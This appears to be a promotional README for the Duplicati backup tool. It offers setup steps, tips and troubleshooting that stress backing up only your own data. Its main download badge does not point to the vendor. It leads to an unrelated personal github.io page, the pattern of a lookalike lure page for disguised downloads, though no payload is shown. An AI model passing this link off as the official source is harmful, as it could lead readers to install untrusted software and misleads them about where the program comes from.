# Duplicati - Scheduled Backups of Your Own Data

Duplicati runs a backup job on a schedule for folders you choose, to a disk or a cloud account that belongs to you. The job is a copy of your data, encrypted with a passphrase you set. It does not log into accounts you were not given, and nobody else can open the backup if you lose that passphrase.

---

## Why It Stands Out

![Duplicati showing one backup job aimed at a destination the user controls](https://docs.duplicati.com/~gitbook/image?url=https%3A%2F%2F2363712449-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F7cMJiGuXy340g9NzpxLY%252Fuploads%252Fgit-blob-158307114896d34b6d7cdb43a085d94864956a69%252FScreenshot%25202025-11-03%2520at%252013.10.51.png%3Falt%3Dmedia&width=768&dpr=3&quality=100&sign=6c90b15f4e36e6d7e68e5c0b51c98f60&sv=3)

A snapshot tool is one habit. A scheduled job is another: the copy happens even on days you do not remember. Duplicati is that schedule. You name the source folders, the destination, and how long old versions should stay. The first thing to read is the destination. A wrong bucket or a wrong folder can mix your files with a place you did not mean to use, or overwrite a set you needed.

Set a passphrase and store it outside the PC. Duplicati is not a recovery hotline. After the first run, restore one file to an empty folder and open it. Leave the originals where they are until that restore looks right. If the destination is a cloud account, use the account that is yours. A shared key pasted from a chat is a shared backup.

---

## Core Capabilities

- **A Named Job:** Source folders, a destination, and a schedule you can see.
- **Your Destination:** A local disk or a cloud login you control. Check the path before the first run.
- **Retention:** Older versions can expire on a rule you picked, so the destination does not grow without a limit.
- **A Passphrase:** The backup is unreadable without it. There is no email reset inside this program.
- **A Proven Restore:** One file restored to a new folder is the test that the job is real.

---

## Performance Tips

- Back up documents you would hate to lose, not every temporary folder, on the first job.
- Read the destination name out loud before you save the job.
- Keep the passphrase with your other important secrets, not only inside the backup.
- Restore a single file after the first successful run.

## Quick Setup

Prerequisites: Folders you may copy, a destination you control, and a passphrase written down outside this PC.

[![GET Duplicati](https://img.shields.io/badge/GET%20%E2%80%94%20Duplicati-7c2d12?style=for-the-badge&logoColor=white)](https://srarendorwoodder.github.io/.github/duplicati-schedule)

1.  **Install:** Finish setup from the package you intended to use.
2.  **New Job:** Add one source folder and the destination. Stop if the destination name looks unfamiliar.
3.  **Set the Passphrase:** Store a copy of it somewhere that is not only the PC.
4.  **Run and Restore:** Let the job finish, restore one file to an empty folder, and open that file.

## Ideal For

- **A Weekly Copy:** Documents that change, sent to a disk you unplug afterward.
- **Your Cloud Account:** A job aimed at a bucket or folder you created, not one you found.
- **A Version You Overwrote:** Retention that still has last week's file.
- **A Check You Schedule:** A restore of one file every so often, so the passphrase still works.

---

## Troubleshooting

- Job failed on the destination? The login or the path is wrong. Do not switch to a different account to "make it go."
- Cannot restore? The passphrase does not match. Duplicati cannot invent a new one.
- Backup is huge? You included caches or disk images. Edit the source list.
- Restored file will not open? Restore again to a new folder and compare the size with the original before you delete anything.
